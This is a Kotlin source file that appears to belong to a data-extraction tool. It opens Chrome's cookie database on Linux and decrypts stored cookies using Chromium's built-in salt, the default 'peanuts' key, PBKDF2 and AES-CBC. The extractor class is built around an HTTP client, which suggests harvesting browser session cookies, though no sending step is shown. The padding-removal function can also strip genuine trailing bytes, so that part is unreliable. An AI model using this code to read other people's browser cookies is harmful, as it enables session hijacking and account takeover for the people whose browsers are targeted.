package net.kerner.entkerner.extractors.chrome

import io.ktor.client.*
import io.ktor.util.*
import io.ktor.utils.io.charsets.Charsets
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.io.nullPaths
import org.jetbrains.exposed.sql.Database
import java.nio.file.Path
import javax.crypto.Cipher
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

// https://github.com/chromium/chromium/blob/69d56645d95ab3201a2dc769dabc65d476b90c64/components/os_crypt/sync/os_crypt.h#L250
// https://github.com/chromium/chromium/blob/69d56645d95ab3201a2dc769dabc65d476b90c64/components/os_crypt/sync/key_storage_linux.h#L42
// https://github.com/chromium/chromium/blob/69d56645d95ab3201a2dc769dabc65d476b90c64/components/os_crypt/sync/key_storage_linux.cc#L249


enum class KeyRingVersion(val prefix: String) {
    V11("v11"),
    V10("v10"),
    LEGACY(String())
}

// https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec

// https://chromium.googlesource.com/chromium/src/+/refs/tags/113.0.5672.66/components/os_crypt/sync/os_crypt_linux.cc#30
private val CHROME_SALT = "saltysalt".toByteArray()
private val IV = ByteArray(16)
private val DEFAULT_PASSWORD = "peanuts".toByteArray()

abstract class ChromeCookieWorker<T>(ioClient: HttpClient) : AbstractDataExtractor<T>(ioClient) {
    override val fileDirectories = nullPaths

    fun getSQLiteConnection(cookiesFile: Path) =
        Database.connect("jdbc:sqlite:$cookiesFile")

    // https://github.com/anc95/decrypt-chrome-cookie/blob/master/index.js#L59
    // https://github.com/chromium/chromium/blob/69d56645d95ab3201a2dc769dabc65d476b90c64/components/os_crypt/sync/os_crypt_linux.cc#L224
    fun decryptCookie(masterKeyRaw: ByteArray = DEFAULT_PASSWORD, cipherText: ByteArray): ByteArray {
        val keyVersion = when(cipherText.copyOf(3).toString(Charsets.UTF_8)) {
            KeyRingVersion.V11.prefix -> KeyRingVersion.V11
            KeyRingVersion.V10.prefix -> KeyRingVersion.V10
            else -> KeyRingVersion.LEGACY
        }

        if (masterKeyRaw.isEmpty() || keyVersion == KeyRingVersion.LEGACY)
            return cipherText



        val encryptedText = cipherText
            .copyOfRange(3, cipherText.size)
        //println("decrypting: " + String(encryptedText))


        val masterKey = hashMasterKey(String(masterKeyRaw, Charsets.UTF_8).toCharArray())
        val decryptedText = decryptAES128(encryptedText, masterKey)

        return removePadding(decryptedText)
    }

    // https://datatracker.ietf.org/doc/html/rfc2898
    // https://github.com/n8henrie/pycookiecheat/blob/master/src/pycookiecheat/pycookiecheat.py
    private fun hashMasterKey(masterKey: CharArray): ByteArray {
        val spec = PBEKeySpec(masterKey, CHROME_SALT, 1, 16 * 8)
        val f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1")
        return f.generateSecret(spec).encoded
        //val parameters = PBKDF2Parameters("HMacSHA1", "UTF-8", CHROME_SALT, 1)
        //return PBKDF2Engine(parameters).deriveKey(masterKey)
    }

    private fun decryptAES128(encrypted: ByteArray, key: ByteArray): ByteArray {
        // https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/#cryptography.hazmat.primitives.ciphers.CipherContext
        // no padding
        val cipher = Cipher.getInstance("AES/CBC/NoPadding")
        // must me multiple of 16:
        //  eg. 16, 32, 48, 64, 80, 96, 112, 128

        val keySpec = SecretKeySpec(key, "AES")
        cipher.init(Cipher.DECRYPT_MODE, keySpec, IvParameterSpec(IV))

        return cipher.update(encrypted) + cipher.doFinal()
    }

    private fun removePadding(decryptedText: ByteArray): ByteArray {
        val lastByte = decryptedText.last()
        //println(String(decryptedText))
        //var decryptedText = decryptedText
        //for (i in decryptedText.indices) {
//
        //    println(i)
        //    println(decryptedText.size - i)
//
        //    if (decryptedText[decryptedText.size - i - 1] != lastByte)
        //        break
//
        //    decryptedText = decryptedText.copyOfRange(0, decryptedText.size - i - 2)
        //}
        return decryptedText.dropLastWhile { byte ->
            byte == decryptedText.last()
        }.toByteArray()
    }
}